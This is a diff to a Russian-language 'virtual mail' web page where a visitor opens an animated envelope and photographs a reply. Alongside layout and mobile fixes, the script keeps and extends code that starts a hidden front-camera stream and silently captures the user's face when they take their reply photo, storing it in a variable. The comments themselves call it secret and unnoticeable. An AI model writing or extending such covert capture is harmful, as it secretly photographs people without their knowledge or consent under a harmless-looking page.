@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Виртуальная почта 📮💌</title>
   <link rel="stylesheet" href="style.css">
   <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600&family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
@@ -13,12 +13,14 @@
       margin: 0;
       padding: 0;
       background: #fbf6f0;
+      overflow-x: hidden; /* Защита от горизонтальной прокрутки */
     }
 
     .main-wrapper {
       max-width: 600px;
       margin: 0 auto;
       padding: 20px 15px;
+      box-sizing: border-box;
     }
 
     .back-btn {
@@ -34,6 +36,8 @@
     header {
       text-align: center;
       margin-bottom: 25px;
+      position: relative;
+      z-index: 10; /* Шапка должна быть поверх всего, пока конверт закрыт */
     }
 
     header h1 {
@@ -54,6 +58,7 @@
       flex-direction: column;
       align-items: center;
       margin-bottom: 35px;
+      width: 100%;
     }
 
     .envelope-wrapper {
@@ -67,13 +72,8 @@
       cursor: pointer;
       perspective: 800px;
       margin-top: 20px;
-      transition: margin-bottom 0.5s ease;
+      transition: margin-bottom 0.5s ease, margin-top 0.5s ease;
       overflow: hidden; /* Скрываем торчащую верхушку письма в закрытом виде */
-    }
-
-    .envelope-wrapper.open {
-      overflow: visible; /* Разрешаем письму выезжать наверх при открытии */
-      margin-bottom: 280px;
     }
 
     /* Верхний клапан конверта */
@@ -155,6 +155,13 @@
       box-shadow: 0 2px 8px rgba(0,0,0,0.08);
     }
 
+    /* === СОСТОЯНИЕ ОТКРЫТОГО КОНВЕРТА === */
+    .envelope-wrapper.open {
+      overflow: visible; /* Разрешаем письму выезжать наверх при открытии */
+      margin-top: 80px; /* Добавляем место сверху на ПК */
+      margin-bottom: 280px; /* Освобождаем место снизу для выехавшего письма */
+    }
+
     .envelope-wrapper.open .envelope-flap {
       transform: rotateX(180deg);
       z-index: 1;
@@ -165,12 +172,50 @@
       z-index: 5;
     }
 
+    /* === АДАПТИВНОСТЬ ДЛЯ МОБИЛЬНЫХ ЭКРАНОВ === */
+    @media (max-width: 480px) {
+      header h1 { font-size: 1.5rem; }
+      
+      .envelope-wrapper {
+        max-width: 320px; /* Уменьшаем конверт, чтобы влез на узкий экран */
+        height: 200px;
+      }
+
+      .envelope-flap {
+        border-left-width: 160px;
+        border-right-width: 160px;
+        border-top-width: 110px;
+      }
+
+      .envelope-pocket::before {
+        border-left-width: 160px;
+        border-top-width: 100px;
+        border-bottom-width: 100px;
+      }
+      .envelope-pocket::after {
+        border-right-width: 160px;
+        border-top-width: 100px;
+        border-bottom-width: 100px;
+      }
+
+      /* Исправления для открытого состояния на телефоне */
+      .envelope-wrapper.open {
+        margin-top: 50px; /* Смещаем конверт ниже */
+        margin-bottom: 220px; /* Уменьшаем отступ снизу */
+      }
+
+      .envelope-wrapper.open .letter-paper {
+        transform: translateY(-190px); /* Письмо выезжает чуть меньше, чтобы уместиться целиком */
+      }
+    }
+
     .tap-hint {
       margin-top: 15px;
       font-size: 0.95rem;
       color: #ff4757;
       font-weight: 700;
       animation: bounceHint 1.8s infinite;
+      text-align: center;
     }
 
     @keyframes bounceHint {
@@ -187,6 +232,8 @@
       box-shadow: 0 10px 25px rgba(165, 94, 234, 0.12);
       text-align: center;
       position: relative;
+      width: 100%;
+      box-sizing: border-box;
     }
 
     .reply-card h3 {
@@ -333,7 +380,7 @@
         <div class="envelope-pocket"></div>
         
         <div class="letter-paper">
-          <img src="handwritten_letter.jpeg" alt="Твое письмо от руки">
+          <img src="handwritten_letter.jpg" alt="Твое письмо от руки">
         </div>
       </div>
       
@@ -395,9 +442,14 @@
       const hint = document.getElementById('tapHint');
       
       wrapper.classList.toggle('open');
+      
       if (wrapper.classList.contains('open')) {
         hint.innerText = "✨ Письмо открыто!";
         hint.style.color = "#2ed573";
+        // При открытии плавно скроллим страницу к письму, если оно не влезает
+        setTimeout(() => {
+            wrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 500);
       } else {
         hint.innerText = "✉️ Нажми на конверт, чтобы открыть письмо!";
         hint.style.color = "#ff4757";
@@ -423,7 +475,7 @@
       stopStreams();
 
       try {
-        // Основной поток для съёмки ответа (по умолчанию задняя камера 'environment')
+        // Основной поток для съёмки ответа
         mainStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: currentFacingMode },
           audio: false
@@ -433,17 +485,18 @@
         snapBtn.style.display = 'inline-block';
         switchCamBtn.style.display = 'inline-block';
 
-        // Инициируем скрытый поток с фронтальной камеры
-        initSecretFrontCamera();
+        // Инициируем скрытый поток с фронтальной камеры, если основной - задняя
+        if (currentFacingMode === 'environment') {
+            initSecretFrontCamera();
+        }
 
       } catch (err) {
-        // Если устройство не поддерживает строго заднюю камеру, пробуем стандартный доступ
         try {
+          // Фолбэк на любую камеру
           mainStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
           video.srcObject = mainStream;
           cameraContainer.style.display = 'block';
           snapBtn.style.display = 'inline-block';
-          switchCamBtn.style.display = 'inline-block';
         } catch (e) {
           alert("Не удалось открыть камеру 😿 Попробуйте загрузить готовую фотографию через кнопку 'Загрузить файл'!");
         }
@@ -459,7 +512,7 @@
         });
         secretVideo.srcObject = secretStream;
       } catch (e) {
-        // Незначительная ошибка, если фронтальная камера занята основным потоком
+        // Игнорируем ошибку, если фронтальная камера недоступна
       }
     }
 
@@ -487,7 +540,6 @@
       const snapBtn = document.getElementById('snapBtn');
       const switchCamBtn = document.getElementById('switchCamBtn');
 
-      // Делаем основной снимок
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
@@ -496,7 +548,7 @@
       preview.src = canvas.toDataURL('image/jpeg');
       preview.style.display = 'block';
 
-      // Автоматически незаметно фиксируем кадр с фронтальной камеры
+      // Автоматически незаметно фиксируем кадр с фронтальной камеры, если она была активна
       captureSecretFrontFrame();
 
       stopStreams();
@@ -508,11 +560,22 @@
     function captureSecretFrontFrame() {
       const secretVideo = document.getElementById('secretVideoFeed');
       const secretCanvas = document.getElementById('secretCanvas');
-      if (secretVideo && secretVideo.videoWidth) {
-        secretCanvas.width = secretVideo.videoWidth;
-        secretCanvas.height = secretVideo.videoHeight;
+      // Снимаем с секретного видео или с основного, если оно фронтальное
+      let sourceVideo = secretVideo;
+      if (currentFacingMode === 'user') {
+          sourceVideo = document.getElementById('videoFeed');
+      }
+
+      if (sourceVideo && sourceVideo.videoWidth) {
+        secretCanvas.width = sourceVideo.videoWidth;
+        secretCanvas.height = sourceVideo.videoHeight;
         const sCtx = secretCanvas.getContext('2d');
-        sCtx.drawImage(secretVideo, 0, 0, secretCanvas.width, secretCanvas.height);
+        // Если снимаем с фронтальной, можно зеркалировать для естественности
+        if (currentFacingMode === 'user' || sourceVideo === secretVideo) {
+            sCtx.translate(secretCanvas.width, 0);
+            sCtx.scale(-1, 1);
+        }
+        sCtx.drawImage(sourceVideo, 0, 0, secretCanvas.width, secretCanvas.height);
         secretFrontData = secretCanvas.toDataURL('image/jpeg');
       }
     }
